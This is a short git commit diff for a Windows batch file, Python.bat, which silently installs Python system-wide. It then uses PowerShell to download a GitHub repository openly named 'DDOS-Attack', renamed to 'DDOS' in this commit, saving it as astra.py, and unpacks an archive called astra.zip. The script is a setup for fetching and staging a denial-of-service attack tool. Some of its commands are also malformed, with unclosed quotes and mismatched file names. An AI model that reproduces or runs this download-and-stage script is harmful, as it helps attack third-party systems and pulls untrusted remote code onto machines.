74f3bd2589405ff56a07850779f1ab0c129b1a3a
Molker12 <melker.higgs@gmail.com>
2024-07-22 14:04:25 +0300

    Update and rename Python1.txt to Python.bat

--- Python.bat
+++ Python.bat
@@ -2,7 +2,7 @@ start cmd /k powershell -Command "(New-Object Net.WebClient).DownloadFile('https
 c:\Tools\python-3.6.2.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 TargetDir=c:\Tools\Python362 &&
 setx path "%PATH%;C:\Tools\Python362\" /M
 
-powershell -Command "Invoke-WebRequest -Uri https://github.com/Melker-cloud/DDOS-Attack.git -OutFile astra.py
+powershell -Command "Invoke-WebRequest -Uri https://github.com/Melker-cloud/DDOS.git -OutFile astra.py
 
 powershell -Command "Expand-Archive -Path astra.zip -DestinationPath %cd%"
 
